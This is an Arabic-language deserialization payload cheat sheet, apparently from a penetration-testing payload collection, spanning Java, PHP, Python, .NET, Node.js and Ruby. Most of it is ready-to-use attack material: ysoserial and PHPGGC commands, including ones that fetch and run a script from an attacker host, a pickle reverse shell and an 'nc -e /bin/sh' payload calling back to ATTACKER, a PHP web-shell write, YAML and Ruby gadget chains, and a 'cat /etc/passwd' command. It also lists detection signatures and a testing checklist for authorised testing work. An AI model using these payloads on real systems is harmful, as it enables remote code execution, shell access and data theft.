<a id="-deserialization-payloads"></a>
# 🔓 حمولات إلغاء التسلسل (Deserialization)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Deserialization.tr.md) • [🇬🇷 Ελληνικά](Deserialization.el.md)

```
██████╗ ███████╗███████╗███████╗██████╗ ██╗ █████╗ ██╗     ██╗███████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║     ██║╚══███╔╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║  ██║█████╗  ███████╗█████╗  ██████╔╝██║███████║██║     ██║  ███╔╝ ███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║  ██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗██║██╔══██║██║     ██║ ███╔╝  ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██████╔╝███████╗███████║███████╗██║  ██║██║██║  ██║███████╗██║███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

> الرسم النصي أعلاه يعرض عنوان المجموعة بالإنجليزية؛ تُشرح الموضوعات والمصطلحات بالعربية في الأقسام التالية.

> **ملاحظة توافق:** أمثلة Phar هنا تصف سلوكًا قديمًا؛ ابتداءً من PHP 8.0 لم تعد بيانات Phar الوصفية تُلغى تسلسلتها تلقائيًا عند الوصول إلى الأرشيف. كما تغيّرت بعض المقارنات غير الصارمة بين الأعداد والسلاسل غير الرقمية. احتُفظ بحمولات المصدر كما هي، ويعتمد نجاحها على الشيفرة والإصدار وسلسلة الأدوات المتاحة. [دليل انتقال PHP 8.0](https://www.php.net/manual/en/migration80.incompatible.php).

---

<a id="-java-deserialization"></a>
## ☕ إلغاء التسلسل في Java

<a id="detection"></a>
### الكشف
```
# البايتات المميزة للتنسيق (Magic bytes)
AC ED 00 05    # كائن Java متسلسل (Base64: rO0AB)
H4sIAAAA       # مضغوط بتنسيق GZip

# المواضع الشائعة
- ملفات تعريف الارتباط (بترميز Base64)
- حقول النماذج المخفية
- ViewState
- معاملات API
- RMI (المنفذ 1099)
- JMX (المنفذ 9010)
```

<a id="ysoserial---payload-generator"></a>
### ysoserial - مولّد الحمولات
```bash
# التثبيت
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package

# توليد الحمولة
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
java -jar ysoserial.jar CommonsCollections5 "curl http://ATTACKER/shell.sh | bash"
java -jar ysoserial.jar CommonsCollections6 "ping -c 3 ATTACKER"

# سلاسل الأدوات البرمجية (Gadget chains) الشائعة
CommonsCollections1-7
CommonsCollectionsBeanutils
Jdk7u21
Spring1
Hibernate1
Groovy1
```

<a id="dns-exfiltration-payload"></a>
### حمولة تسريب البيانات عبر DNS
```bash
# توليد حمولة اتصال راجع عبر DNS
java -jar ysoserial.jar URLDNS "http://BURP_COLLAB" | base64

# الكشف عبر DNS
java -jar ysoserial.jar JRMPClient "ATTACKER:1099"
```

<a id="common-vulnerable-libraries"></a>
### مكتبات شائعة عرضة للثغرات
```
commons-collections:3.1-4.0
commons-beanutils
spring-beans
hibernate
```

---

<a id="-php-deserialization"></a>
## 🐘 إلغاء التسلسل في PHP

<a id="magic-methods"></a>
### الأساليب السحرية (Magic Methods)
```php
__construct()    // إنشاء الكائن
__destruct()     // إتلاف الكائن
__wakeup()       // إلغاء التسلسل
__sleep()        // التسلسل
__toString()     // تحويل الكائن إلى سلسلة نصية
__call()         // استدعاء أسلوب غير متاح
__get()          // قراءة خاصية غير متاحة
__set()          // الكتابة إلى خاصية غير متاحة
```

<a id="basic-payload"></a>
### حمولة أساسية
```php
// تنسيق الكائن المتسلسل
O:8:"ClassName":1:{s:4:"prop";s:5:"value";}

// كائن يحتوي على خصائص
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// مصفوفة
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

<a id="type-juggling"></a>
### التلاعب بتحويل الأنواع (Type Juggling)
```php
// التجاوز باستخدام القيمة المنطقية true
O:4:"User":1:{s:8:"password";b:1;}

// المقارنة بالعدد الصحيح 0
O:4:"User":1:{s:8:"password";i:0;}

// تجاوز مقارنة المصفوفات
O:4:"User":1:{s:8:"password";a:0:{}}
```

<a id="pop-chain-payloads"></a>
### حمولات سلاسل البرمجة الموجّهة بالخصائص (POP)
```php
// الكتابة إلى ملف اختياري
O:8:"LogClass":1:{s:4:"file";s:11:"/tmp/shell.php";s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}

// تنفيذ الأوامر عبر __destruct()
O:10:"SystemExec":1:{s:3:"cmd";s:2:"id";}
```

<a id="phpggc---php-gadget-chain"></a>
### PHPGGC - سلاسل الأدوات البرمجية في PHP
```bash
# التثبيت
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# عرض الأدوات البرمجية
./phpggc -l

# توليد الحمولة
./phpggc Laravel/RCE1 system id
./phpggc Symfony/RCE4 exec "id"
./phpggc Monolog/RCE1 exec "whoami"
./phpggc Guzzle/RCE1 system "cat /etc/passwd"

# الترميز باستخدام Base64
./phpggc -b Laravel/RCE1 system "id"

# الترميز باستخدام URL
./phpggc -u Laravel/RCE1 system "id"

# باستخدام غلاف PHAR
./phpggc -p phar Laravel/RCE1 system id -o exploit.phar
```

<a id="phar-deserialization"></a>
### إلغاء التسلسل في Phar
```php
// قد يؤدي الوصول إلى ملفات Phar إلى إلغاء التسلسل
phar://path/to/phar.phar/internal-file

// أساليب الوصول التي تستخدم phar://
file_get_contents("phar://...")
file_exists("phar://...")
include("phar://...")
fopen("phar://...")
```

---

<a id="-python-deserialization-pickle"></a>
## 🐍 إلغاء التسلسل في Python باستخدام Pickle

<a id="basic-payload-1"></a>
### حمولة أساسية
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(payload.hex())
```

<a id="reverse-shell-payload"></a>
### حمولة صدفة عكسية
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

<a id="detection-1"></a>
### الكشف
```
# البايتات المميزة للتنسيق (Magic bytes)
80 04 95    # البروتوكول 4 (Python 3)
80 03       # البروتوكول 3
80 02       # البروتوكول 2

# أنماط Base64 الشائعة
gASV        # البروتوكول 4
gAN         # البروتوكول 3
```

<a id="yaml-deserialization-python"></a>
### إلغاء تسلسل YAML في Python
```yaml
# تحميل غير آمن باستخدام PyYAML
!!python/object/apply:os.system ["id"]
!!python/object/new:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]

# أوامر متعددة
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - /bin/bash
  - -c
  - "curl http://ATTACKER/shell.sh | bash"
```

---

<a id="-net-deserialization"></a>
## 🔷 إلغاء التسلسل في .NET

<a id="detection-2"></a>
### الكشف
```
# ViewState
__VIEWSTATE parameter (Base64)

# BinaryFormatter
AAEAAAD/////    # بادئة مميزة بترميز Base64

# JSON.NET
$type field in JSON
```

<a id="ysoserialnet---payload-generator"></a>
### ysoserial.net - مولّد الحمولات
```powershell
# التنزيل
# https://github.com/pwntester/ysoserial.net

# توليد الحمولة
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64

# أدوات برمجية شائعة
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"

# استغلال ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c ping ATTACKER" --path="/test.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

<a id="jsonnet-typenamehandling"></a>
### الخيار TypeNameHandling في JSON.NET
```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList",
        "$values": ["cmd.exe", "/c calc.exe"]
    }
}
```

---

<a id="-javascriptnodejs"></a>
## 🟨 JavaScript/Node.js

<a id="node-serialize"></a>
### node-serialize
```javascript
// Vulnerable code: unserialize(user_input)
// حمولة باستخدام تعبير دالة يُستدعى فورًا (IIFE)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

// صدفة عكسية
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc -e /bin/sh ATTACKER 4444')}()"}
```

<a id="serialize-javascript"></a>
### serialize-javascript
```javascript
// إذا استُخدمت eval() على البيانات بعد إلغاء تسلسلها
(function(){require('child_process').execSync('id')})()
```

---

<a id="-ruby-deserialization"></a>
## 🔴 إلغاء التسلسل في Ruby

<a id="marshalload"></a>
### Marshal.load
```ruby
# إنشاء الحمولة
require 'base64'
code = "system('id')"
payload = "\x04\x08o:\x15Gem::Requirement\x06:\x10@requirements[\x06o:\x18Gem::Package::TarReader\x06:\x09@ioo:\x15Gem::Package::TarReader::Entry\x06:\x0A@headI\"\x00#{code}\x06:\x06ET"
puts Base64.encode64(payload)
```

<a id="yamlload-psych"></a>
### YAML.load (Psych)
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

---

<a id="-testing-checklist"></a>
## 📋 قائمة التحقق للاختبار

```markdown
□ تحديد تنسيق التسلسل (Base64 أو ست عشري أو بايتات مميزة)
□ تحديد اللغة أو إطار العمل (Java, PHP, Python, .NET)
□ تحديد إصدارات المكتبات المعرضة للثغرات
□ توليد الحمولات بالأداة المناسبة
□ الاختبار الأعمى باستخدام اتصالات راجعة عبر DNS/HTTP
□ اختبار قراءة الملفات والكتابة إليها
□ اختبار تنفيذ الشيفرة
□ تجربة سلاسل أدوات برمجية (Gadget chains) مختلفة
□ تجاوز المرشحات (الترميز والضغط)
```

---

<a id="-tools-summary"></a>
## 🔗 ملخص الأدوات

| اللغة | الأداة | الاستخدام |
|----------|------|-------|
| **Java** | ysoserial | `java -jar ysoserial.jar GADGET "cmd"` |
| **PHP** | PHPGGC | `./phpggc GADGET system "cmd"` |
| **Python** | مخصص | `pickle.dumps(Exploit())` |
| **.NET** | ysoserial.net | `ysoserial.exe -g GADGET -f FORMAT -c "cmd"` |
| **Ruby** | مخصص | إنشاء الحمولة يدويًا |

---

<a id="-related-payloads"></a>
## 🔗 حمولات ذات صلة

- [حمولات SSTI](./SSTI.ar.md)
- [حقن الأوامر](./Command-Injection.ar.md)

---

**العودة إلى الحمولات:** [💉 مجموعة الحمولات](../../README.md#-payloads-collection)
